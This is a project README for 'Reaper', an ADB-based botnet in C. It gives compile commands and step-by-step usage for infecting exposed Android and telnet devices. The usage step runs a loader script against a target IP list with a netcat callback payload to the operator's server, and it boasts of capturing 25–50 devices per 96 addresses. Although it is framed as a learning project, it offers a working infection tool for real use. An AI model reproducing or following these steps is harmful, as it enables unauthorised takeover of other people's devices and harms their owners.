<h1 align="center">
	<img src="https://static.thenounproject.com/png/4050176-200.png" width="150px"><br>
    Reaper - An ADB-based botnet written in C.
</h1>
<p align="center">
	Reaper is an ADB-based botnet that lets you control the devices you infect, execute commands, and contains extra tools for playing around. It isn't just limited 
	to ADB, it can be used as a telnet botnet, or a regular botnet.
</p>

<p align="center">
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
     </a>
	<a href="https://deno.land" target="_blank">
    	<img src="https://img.shields.io/badge/Deno-1.0.0+-7DCDE3?style=for-the-badge" alt="Node">
     </a>
</p>

## Why?

Here are few reasons why I made this:
```
- I wanted to learn more about botnets.
- I wanted to make something that will help other people understand and learn more about botnets.
- I wanted to make my own from scratch, because most botnets that are available on github are all variants of mirai or qbot.
```
Extra Facts:
```
- Yes, I know, I could've used epoll, but I didn't want to make things super-complicated and annoying.
- No, this does not contain any DDoS methods, If you want to customize this and add your own, then you are free to do so.
```

## Installation
```
gcc -o reaper reaper.c -lpthread -lcurl
gcc -o client client.c
```

## Usage
After you have authenticated with the botnet and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices. Please remember, you don't have to limit yourself to only android devices, if you want to use a telnet list, it will also work.

## Screenshots
![Screenshot_2021-08-21-05-36-18_922x559](https://user-images.githubusercontent.com/86132648/130317740-f9882527-6632-4529-b776-dd224e7bc6ef.png)
![Screenshot_2021-08-18-06-41-40_893x237](https://user-images.githubusercontent.com/86132648/130317747-3e312623-450b-4a04-8bad-a9ebe8247491.png)

## Credits
```
https://github.com/0x1CA3
```
### Contributions 🎉
###### All contributions are accepted, simply open an Issue / Pull request.
